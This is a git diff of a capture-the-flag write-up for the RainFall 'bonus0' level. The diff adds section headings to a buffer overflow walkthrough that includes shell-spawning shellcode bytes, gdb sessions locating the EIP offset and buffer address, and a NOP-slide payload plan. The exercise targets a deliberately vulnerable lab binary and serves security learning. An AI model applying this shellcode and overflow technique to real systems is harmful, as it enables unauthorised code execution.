@@ -47,6 +47,8 @@ Then use the second string to overflow and write the address of our malicious co
 
 Using [this compact system call opening a shell](http://shell-storm.org/shellcode/files/shellcode-827.php) we create our malicious code. ```\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80```
 
+### Find EIP offset
+
 Then we need to find the EIP offset where to write the address of our malicious code. Using the following example with [this EIP offset tool](https://projects.jason-rush.com/tools/buffer-overflow-eip-offset-string-generator/), we find the EIP offset is 9.
 ```
 bonus0@RainFall:~$ gdb -q bonus0
@@ -61,6 +63,8 @@ Program received signal SIGSEGV, Segmentation fault.
 0x41336141 in ?? ()
 ```
 The buffer is 42 bytes (0x40 - 0x16), so we want to overwrite the return address at buffer[54].
+
+### Find buffer address
 
 To find the address of our malicious code
 ```
@@ -81,6 +85,8 @@ Breakpoint 1, 0x080484d0 in p ()
 0xbfffe640:	0x00000000
 ```
 The buffer starts at ```0xbfffe640```. We will create a large NOP slide leading to our malicious code, so lets overwrite EIP wih an address somewhere on the NOP slide, let's say buffer + 100 ```0xbfffe6a4``` = "\xa4\xe6\xff\xbf".
+
+### Build exploit strings
 
 So we want to craft our first string:
 1. A large NOP slide buffer leading to our malicious code - ```'\x90' * 3000```
